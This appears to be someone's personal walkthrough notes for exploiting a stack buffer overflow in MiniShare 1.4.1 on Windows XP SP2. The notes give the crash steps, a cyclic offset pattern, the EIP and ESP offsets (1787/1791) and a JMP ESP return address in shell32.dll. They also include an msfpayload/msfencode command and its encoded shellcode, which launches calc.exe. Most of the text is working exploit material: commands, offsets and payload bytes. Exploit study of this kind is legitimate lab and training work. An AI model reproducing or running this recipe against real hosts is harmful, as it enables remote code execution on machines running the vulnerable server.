xp sp2 - minishare 1.4.1 - run calc.exe

1. run exp1.py -> crash 41414141
2. view modules -> shell32.dll -> search for JMP ESP -> 0x7CA58265 (its free of \x00\x0a\x0d, CTRL+L if isnt )
3. build with pattern_create.rb 2220 bytes to identify

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9

4. we run expl2.py -> crash 36684335
4. we found that EIP war rewrited with 36684335 and ESP points to a string Ch7Ch8Ch9Ci..
5. We find the exact location of EIP = "match at 1787" and ESP = "match at 1791"
6. we run exp3.py and we have EIP 41414141 and ESP next to it
7. we do some endian ordering for x86 processors and we build the JMP ESP adress 0x 7C A5 82 65 -> 0x 65 82 A5 7C
8. we edit exp3.py and put EIP builded before and we set a breakpoint at 0x7CA58265
9.we run exp4.py -> we get a RET
10. msfpayload windows/exec CMD=calc.exe R | msfencode -a x86 -b '\x00\x0a\x0d' -t c
 
unsigned char buf[] = 
"\xdb\xca\xd9\x74\x24\xf4\x58\xbb\x17\xb3\xcd\x3f\x2b\xc9\xb1"
"\x33\x31\x58\x17\x83\xe8\xfc\x03\x4f\xa0\x2f\xca\x93\x2e\x26"
"\x35\x6b\xaf\x59\xbf\x8e\x9e\x4b\xdb\xdb\xb3\x5b\xaf\x89\x3f"
"\x17\xfd\x39\xcb\x55\x2a\x4e\x7c\xd3\x0c\x61\x7d\xd5\x90\x2d"
"\xbd\x77\x6d\x2f\x92\x57\x4c\xe0\xe7\x96\x89\x1c\x07\xca\x42"
"\x6b\xba\xfb\xe7\x29\x07\xfd\x27\x26\x37\x85\x42\xf8\xcc\x3f"
"\x4c\x28\x7c\x4b\x06\xd0\xf6\x13\xb7\xe1\xdb\x47\x8b\xa8\x50"
"\xb3\x7f\x2b\xb1\x8d\x80\x1a\xfd\x42\xbf\x93\xf0\x9b\x87\x13"
"\xeb\xe9\xf3\x60\x96\xe9\xc7\x1b\x4c\x7f\xda\xbb\x07\x27\x3e"
"\x3a\xcb\xbe\xb5\x30\xa0\xb5\x92\x54\x37\x19\xa9\x60\xbc\x9c"
"\x7e\xe1\x86\xba\x5a\xaa\x5d\xa2\xfb\x16\x33\xdb\x1c\xfe\xec"
"\x79\x56\xec\xf9\xf8\x35\x7a\xff\x89\x43\xc3\xff\x91\x4b\x63"
"\x68\xa3\xc0\xec\xef\x3c\x03\x49\x1f\x77\x0e\xfb\x88\xde\xda"
"\xbe\xd4\xe0\x30\xfc\xe0\x62\xb1\x7c\x17\x7a\xb0\x79\x53\x3c"
"\x28\xf3\xcc\xa9\x4e\xa0\xed\xfb\x2c\x27\x7e\x67\x9d\xc2\x06"
"\x02\xe1";
 
11. we build exp5.py and we run it